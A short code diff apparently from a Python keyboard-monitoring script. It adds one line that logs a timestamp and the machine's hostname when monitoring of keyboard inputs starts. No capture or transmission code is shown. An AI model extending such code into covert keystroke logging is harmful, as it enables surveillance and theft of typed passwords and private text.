@@ -37,6 +37,7 @@ def write_buffer():
 
 def start_monitor():
     print("Monitoring Keyboard Inputs!")
+    logging.info( ' '+time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())+'-Started Monitoring Keyboard Inputs!'+hostname)
 
 
 
